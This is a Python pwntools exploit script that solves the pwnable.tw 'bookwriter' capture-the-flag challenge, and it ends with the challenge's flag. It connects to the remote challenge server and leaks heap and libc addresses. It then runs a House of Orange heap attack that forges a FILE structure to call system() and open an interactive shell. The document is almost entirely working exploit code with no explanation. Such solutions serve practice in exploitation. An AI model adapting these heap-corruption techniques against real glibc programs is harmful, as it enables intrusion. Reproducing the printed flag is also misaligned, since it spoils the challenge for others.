from pwn import *

elf = ELF("bookwriter")
libc = ELF("libc_64.so.6")
context.binary = elf
r = remote('chall.pwnable.tw', 10304)


def setup(author="A" * 0x40):
    r.sendafter("Author :", author)


def add(size, data="A"):
    r.sendlineafter("choice :", '1')
    r.sendlineafter("page :", str(size))
    r.sendafter("Content :", data)


def leaks(index):
    r.sendlineafter("choice :", '2')
    r.sendlineafter("page :", str(index))
    r.recvlines(2)
    leak = u64(r.recvline().strip(b"\n")[0:6].ljust(8, b"\x00"))
    return leak


def edit(index, data):
    r.sendlineafter("choice :", '3')
    r.sendlineafter("page :", str(index))
    r.sendafter("Content:", data)


def info():
    r.sendlineafter("choice :", '4')
    r.recvuntil("Author : ")
    leak = u64(r.recvline().strip(b"\n")[0x40:].ljust(8, b"\x00"))
    r.sendlineafter("no:0) ", str(0))
    return leak


with log.progress("leaking heap base") as l:
    setup()
    add(0xff8)  # 0
    heap_base = info() - 0x10
    l.success(hex(heap_base))

with log.progress("leaking libc_base") as l:
    add(0x1eda8)  # 1
    add(0xf8)  # 2
    edit(2, "A" * 0xf8)
    edit(2, "A" * 0xf8 + "\x41\x01")
    add(0x150)  # 3
    edit(2, "A" * 0xf8 + "\x41\x21")
    add(0x1210, "\x78")  # 4
    libc_base = leaks(4) - 0x3c4278
    payload = b"A" * 0x78 + p64(0xea1)
    add(0xf10, payload)  # 5
    libc_malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    libc_io_list_all = libc_base + libc.symbols["_IO_list_all"]
    libc_system = libc_base + libc.symbols["system"]
    l.success(hex(libc_base))

with log.progress("House of Orange attack") as l:
    add(0xf00)  # 6
    fp = FileStructure(null=libc_malloc_hook)
    payload = b"A" * 0x68 + p64(libc_system) + fp.orange(libc_io_list_all, heap_base + 0x22158 - 3 * 8)
    edit(5, payload)
    r.sendlineafter("choice :", '1')
    r.sendlineafter("page :", str(0x10))
    l.success()
    r.interactive()

# FLAG --> FLAG{Th3r3_4r3_S0m3_m4gic_in_t0p}
